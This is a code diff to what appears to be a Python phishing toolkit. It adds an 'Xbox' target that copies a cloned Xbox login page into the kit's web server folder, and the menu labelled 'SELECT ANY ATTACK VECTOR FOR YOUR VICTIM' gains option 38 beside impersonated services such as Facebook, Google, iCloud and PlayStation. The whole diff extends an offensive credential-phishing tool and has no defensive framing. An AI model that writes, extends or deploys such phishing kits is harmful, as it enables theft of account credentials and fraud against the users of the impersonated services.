@@ -131,6 +131,8 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         copy_tree("WebPages/subitoit/", "Server/www/")
     elif page == 'PlayStation':
         copy_tree('WebPages/playstation/', "Server/www/")
+    elif page == 'Xbox':
+        copy_tree('WebPages/xbox/', "Server/www/")
 
     else:
         endMessage()
@@ -448,7 +450,7 @@ def mainMenu():
 ________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0))
     print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
     print(" {0}[{1}1{0}]{1} Facebook        {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
-    print(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency".format(
+    print(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
         MAIN0, MAIN2))
     print(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt ".format(
         MAIN0, MAIN2))
@@ -623,6 +625,10 @@ ________________________________________________________________________________
         loadModule('PlayStation')
         customOption = ''
         runPhishing('PlayStation', customOption)
+    elif option == '38':
+        loadModule('Xbox')
+        customOption = ''
+        runPhishing('Xbox', customOption)
 
     else:
         endMessage()
